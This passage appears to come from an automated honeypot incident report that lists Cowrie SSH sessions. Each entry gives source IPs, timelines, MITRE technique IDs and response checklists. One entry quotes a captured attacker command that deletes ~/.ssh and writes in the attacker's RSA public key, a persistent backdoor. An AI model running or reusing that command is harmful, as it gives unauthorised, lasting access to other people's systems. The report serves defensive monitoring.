| `2026-07-19 10:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edc2dbf96dca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:06 |
| **Last Seen** | 2026-07-19 10:06 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:06:01` | `cowrie.session.connect` |
| `2026-07-19 10:06:04` | `cowrie.client.version` |
| `2026-07-19 10:06:04` | `cowrie.client.kex` |
| `2026-07-19 10:06:13` | `cowrie.login.success` |
| `2026-07-19 10:06:20` | `cowrie.session.params` |
| `2026-07-19 10:06:20` | `cowrie.command.input` |
| `2026-07-19 10:06:22` | `cowrie.log.closed` |
| `2026-07-19 10:06:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d023d7b0211

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:06 |
| **Last Seen** | 2026-07-19 10:06 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:06:13` | `cowrie.session.connect` |
| `2026-07-19 10:06:17` | `cowrie.client.version` |
| `2026-07-19 10:06:17` | `cowrie.client.kex` |
| `2026-07-19 10:06:26` | `cowrie.login.success` |
| `2026-07-19 10:06:31` | `cowrie.session.params` |
| `2026-07-19 10:06:31` | `cowrie.command.input` |
| `2026-07-19 10:06:34` | `cowrie.log.closed` |
| `2026-07-19 10:06:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9d39d24277a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:06 |
| **Last Seen** | 2026-07-19 10:06 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:06:29` | `cowrie.session.connect` |
| `2026-07-19 10:06:31` | `cowrie.client.version` |
| `2026-07-19 10:06:31` | `cowrie.client.kex` |
| `2026-07-19 10:06:44` | `cowrie.login.success` |
| `2026-07-19 10:06:52` | `cowrie.session.params` |
| `2026-07-19 10:06:52` | `cowrie.command.input` |
| `2026-07-19 10:06:54` | `cowrie.log.closed` |
| `2026-07-19 10:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7b93d2223bc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:06 |
| **Last Seen** | 2026-07-19 10:07 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:06:40` | `cowrie.session.connect` |
| `2026-07-19 10:06:43` | `cowrie.client.version` |
| `2026-07-19 10:06:43` | `cowrie.client.kex` |
| `2026-07-19 10:06:55` | `cowrie.login.success` |
| `2026-07-19 10:07:01` | `cowrie.session.params` |
| `2026-07-19 10:07:01` | `cowrie.command.input` |
| `2026-07-19 10:07:06` | `cowrie.log.closed` |
| `2026-07-19 10:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d392e63b4aa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:06 |
| **Last Seen** | 2026-07-19 10:07 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:06:54` | `cowrie.session.connect` |
| `2026-07-19 10:06:56` | `cowrie.client.version` |
| `2026-07-19 10:06:56` | `cowrie.client.kex` |
| `2026-07-19 10:07:10` | `cowrie.login.success` |
| `2026-07-19 10:07:16` | `cowrie.session.params` |
| `2026-07-19 10:07:16` | `cowrie.command.input` |
| `2026-07-19 10:07:20` | `cowrie.log.closed` |
| `2026-07-19 10:07:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0877de26c063

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:07 |
| **Last Seen** | 2026-07-19 10:07 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:07:06` | `cowrie.session.connect` |
| `2026-07-19 10:07:09` | `cowrie.client.version` |
| `2026-07-19 10:07:09` | `cowrie.client.kex` |
| `2026-07-19 10:07:21` | `cowrie.login.success` |
| `2026-07-19 10:07:27` | `cowrie.session.params` |
| `2026-07-19 10:07:27` | `cowrie.command.input` |
| `2026-07-19 10:07:30` | `cowrie.log.closed` |
| `2026-07-19 10:07:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df66f7b5b370

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:07 |
| **Last Seen** | 2026-07-19 10:07 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:07:16` | `cowrie.session.connect` |
| `2026-07-19 10:07:20` | `cowrie.client.version` |
| `2026-07-19 10:07:20` | `cowrie.client.kex` |
| `2026-07-19 10:07:30` | `cowrie.login.success` |
| `2026-07-19 10:07:35` | `cowrie.session.params` |
| `2026-07-19 10:07:35` | `cowrie.command.input` |
| `2026-07-19 10:07:36` | `cowrie.log.closed` |
| `2026-07-19 10:07:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f322250b8aeb

| Field | Detail |
|---|---|
| **Source IP** | `111.171.127[.]190` |
| **First Seen** | 2026-07-19 10:07 |
| **Last Seen** | 2026-07-19 10:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:07:26` | `cowrie.session.connect` |
| `2026-07-19 10:07:27` | `cowrie.client.version` |
| `2026-07-19 10:07:27` | `cowrie.client.kex` |
| `2026-07-19 10:07:29` | `cowrie.login.success` |
| `2026-07-19 10:07:30` | `cowrie.direct-tcpip.request` |
| `2026-07-19 10:07:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.127[.]190` to AbuseIPDB if not already reported
- [ ] Block `111.171.127[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d61cbfba428

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:07 |
| **Last Seen** | 2026-07-19 10:07 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:07:35` | `cowrie.session.connect` |
| `2026-07-19 10:07:35` | `cowrie.client.version` |
| `2026-07-19 10:07:35` | `cowrie.client.kex` |
| `2026-07-19 10:07:41` | `cowrie.login.success` |
| `2026-07-19 10:07:47` | `cowrie.session.params` |
| `2026-07-19 10:07:47` | `cowrie.command.input` |
| `2026-07-19 10:07:48` | `cowrie.log.closed` |
| `2026-07-19 10:07:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83297bdaf75b

| Field | Detail |
|---|---|
| **Source IP** | `125.20.207[.]154` |
| **First Seen** | 2026-07-19 10:07 |
| **Last Seen** | 2026-07-19 10:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:07:35` | `cowrie.session.connect` |
| `2026-07-19 10:07:36` | `cowrie.client.version` |
| `2026-07-19 10:07:36` | `cowrie.client.kex` |
| `2026-07-19 10:07:38` | `cowrie.login.success` |
| `2026-07-19 10:07:39` | `cowrie.direct-tcpip.request` |
| `2026-07-19 10:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.20.207[.]154` to AbuseIPDB if not already reported
- [ ] Block `125.20.207[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b3a302c8886

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:07 |
| **Last Seen** | 2026-07-19 10:07 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:07:45` | `cowrie.session.connect` |
| `2026-07-19 10:07:47` | `cowrie.client.version` |
| `2026-07-19 10:07:47` | `cowrie.client.kex` |
| `2026-07-19 10:07:54` | `cowrie.login.success` |
| `2026-07-19 10:07:57` | `cowrie.session.params` |
| `2026-07-19 10:07:57` | `cowrie.command.input` |
| `2026-07-19 10:07:58` | `cowrie.log.closed` |
| `2026-07-19 10:07:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c62e3877157

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:08 |
| **Last Seen** | 2026-07-19 10:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:08:01` | `cowrie.session.connect` |
| `2026-07-19 10:08:03` | `cowrie.client.version` |
| `2026-07-19 10:08:03` | `cowrie.client.kex` |
| `2026-07-19 10:08:04` | `cowrie.login.success` |
| `2026-07-19 10:08:05` | `cowrie.session.params` |
| `2026-07-19 10:08:05` | `cowrie.command.input` |
| `2026-07-19 10:08:06` | `cowrie.log.closed` |
| `2026-07-19 10:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58325639b79b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:08 |
| **Last Seen** | 2026-07-19 10:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:08:16` | `cowrie.session.connect` |
| `2026-07-19 10:08:17` | `cowrie.client.version` |
| `2026-07-19 10:08:17` | `cowrie.client.kex` |
| `2026-07-19 10:08:21` | `cowrie.login.success` |
| `2026-07-19 10:08:24` | `cowrie.session.params` |
| `2026-07-19 10:08:24` | `cowrie.command.input` |
| `2026-07-19 10:08:25` | `cowrie.log.closed` |
| `2026-07-19 10:08:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f75a2057f84

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:08 |
| **Last Seen** | 2026-07-19 10:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:08:28` | `cowrie.session.connect` |
| `2026-07-19 10:08:29` | `cowrie.client.version` |
| `2026-07-19 10:08:29` | `cowrie.client.kex` |
| `2026-07-19 10:08:34` | `cowrie.login.success` |
| `2026-07-19 10:08:37` | `cowrie.session.params` |
| `2026-07-19 10:08:37` | `cowrie.command.input` |
| `2026-07-19 10:08:38` | `cowrie.log.closed` |
| `2026-07-19 10:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e40e3eb929a4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:08 |
| **Last Seen** | 2026-07-19 10:08 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:08:42` | `cowrie.session.connect` |
| `2026-07-19 10:08:42` | `cowrie.client.version` |
| `2026-07-19 10:08:42` | `cowrie.client.kex` |
| `2026-07-19 10:08:50` | `cowrie.login.success` |
| `2026-07-19 10:08:54` | `cowrie.session.params` |
| `2026-07-19 10:08:54` | `cowrie.command.input` |
| `2026-07-19 10:08:57` | `cowrie.log.closed` |
| `2026-07-19 10:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d95783bcf612

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:08 |
| **Last Seen** | 2026-07-19 10:09 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:08:52` | `cowrie.session.connect` |
| `2026-07-19 10:08:53` | `cowrie.client.version` |
| `2026-07-19 10:08:53` | `cowrie.client.kex` |
| `2026-07-19 10:09:02` | `cowrie.login.success` |
| `2026-07-19 10:09:08` | `cowrie.session.params` |
| `2026-07-19 10:09:09` | `cowrie.command.input` |
| `2026-07-19 10:09:11` | `cowrie.log.closed` |
| `2026-07-19 10:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d3361321a13

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:09 |
| **Last Seen** | 2026-07-19 10:09 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:09:02` | `cowrie.session.connect` |
| `2026-07-19 10:09:04` | `cowrie.client.version` |
| `2026-07-19 10:09:04` | `cowrie.client.kex` |
| `2026-07-19 10:09:17` | `cowrie.login.success` |
| `2026-07-19 10:09:25` | `cowrie.session.params` |
| `2026-07-19 10:09:25` | `cowrie.command.input` |
| `2026-07-19 10:09:28` | `cowrie.log.closed` |
| `2026-07-19 10:09:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95c6e18a01b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:09 |
| **Last Seen** | 2026-07-19 10:09 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:09:13` | `cowrie.session.connect` |
| `2026-07-19 10:09:16` | `cowrie.client.version` |
| `2026-07-19 10:09:16` | `cowrie.client.kex` |
| `2026-07-19 10:09:29` | `cowrie.login.success` |
| `2026-07-19 10:09:37` | `cowrie.session.params` |
| `2026-07-19 10:09:37` | `cowrie.command.input` |
| `2026-07-19 10:09:38` | `cowrie.log.closed` |
| `2026-07-19 10:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7029a860ba2a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:09 |
| **Last Seen** | 2026-07-19 10:09 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:09:26` | `cowrie.session.connect` |
| `2026-07-19 10:09:29` | `cowrie.client.version` |
| `2026-07-19 10:09:29` | `cowrie.client.kex` |
| `2026-07-19 10:09:34` | `cowrie.login.success` |
| `2026-07-19 10:09:36` | `cowrie.session.params` |
| `2026-07-19 10:09:36` | `cowrie.command.input` |
| `2026-07-19 10:09:36` | `cowrie.log.closed` |
| `2026-07-19 10:09:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a22ec96dac77

| Field | Detail |
|---|---|
| **Source IP** | `161.35.34[.]21` |
| **First Seen** | 2026-07-19 10:09 |
| **Last Seen** | 2026-07-19 10:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:09:27` | `cowrie.session.connect` |
| `2026-07-19 10:09:27` | `cowrie.client.version` |
| `2026-07-19 10:09:27` | `cowrie.client.kex` |
| `2026-07-19 10:09:27` | `cowrie.login.success` |
| `2026-07-19 10:09:28` | `cowrie.session.params` |
| `2026-07-19 10:09:28` | `cowrie.command.input` |
| `2026-07-19 10:09:28` | `cowrie.command.failed` |
| `2026-07-19 10:09:28` | `cowrie.log.closed` |
| `2026-07-19 10:09:29` | `cowrie.session.params` |
| `2026-07-19 10:09:29` | `cowrie.command.input` |
| `2026-07-19 10:09:29` | `cowrie.session.file_download` |
| `2026-07-19 10:09:29` | `cowrie.log.closed` |
| `2026-07-19 10:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.34[.]21` to AbuseIPDB if not already reported
- [ ] Block `161.35.34[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d880e3319b71

| Field | Detail |
|---|---|
| **Source IP** | `161.35.34[.]21` |
| **First Seen** | 2026-07-19 10:09 |
| **Last Seen** | 2026-07-19 10:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:09:29` | `cowrie.session.connect` |
| `2026-07-19 10:09:29` | `cowrie.client.version` |
| `2026-07-19 10:09:30` | `cowrie.client.kex` |
| `2026-07-19 10:09:30` | `cowrie.login.success` |
| `2026-07-19 10:09:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.34[.]21` to AbuseIPDB if not already reported
- [ ] Block `161.35.34[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a335096c79c

| Field | Detail |
|---|---|
| **Source IP** | `161.35.34[.]21` |
| **First Seen** | 2026-07-19 10:09 |
| **Last Seen** | 2026-07-19 10:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:09:30` | `cowrie.session.connect` |
| `2026-07-19 10:09:30` | `cowrie.client.version` |
| `2026-07-19 10:09:30` | `cowrie.client.kex` |
| `2026-07-19 10:09:30` | `cowrie.login.success` |
| `2026-07-19 10:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.34[.]21` to AbuseIPDB if not already reported
- [ ] Block `161.35.34[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06442dc10d20

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:09 |
| **Last Seen** | 2026-07-19 10:10 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:09:41` | `cowrie.session.connect` |
| `2026-07-19 10:09:42` | `cowrie.client.version` |
| `2026-07-19 10:09:42` | `cowrie.client.kex` |
| `2026-07-19 10:09:53` | `cowrie.login.success` |
| `2026-07-19 10:10:00` | `cowrie.session.params` |
| `2026-07-19 10:10:00` | `cowrie.command.input` |
| `2026-07-19 10:10:06` | `cowrie.log.closed` |
| `2026-07-19 10:10:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1afa6d681f99

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:09 |
| **Last Seen** | 2026-07-19 10:10 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:09:53` | `cowrie.session.connect` |
| `2026-07-19 10:09:56` | `cowrie.client.version` |
| `2026-07-19 10:09:56` | `cowrie.client.kex` |
| `2026-07-19 10:10:13` | `cowrie.login.success` |
| `2026-07-19 10:10:19` | `cowrie.session.params` |
| `2026-07-19 10:10:19` | `cowrie.command.input` |
| `2026-07-19 10:10:22` | `cowrie.log.closed` |
| `2026-07-19 10:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-316d56e21a63

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:10 |
| **Last Seen** | 2026-07-19 10:10 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:10:00` | `cowrie.session.connect` |
| `2026-07-19 10:10:05` | `cowrie.client.version` |
| `2026-07-19 10:10:05` | `cowrie.client.kex` |
| `2026-07-19 10:10:19` | `cowrie.login.success` |
| `2026-07-19 10:10:25` | `cowrie.session.params` |
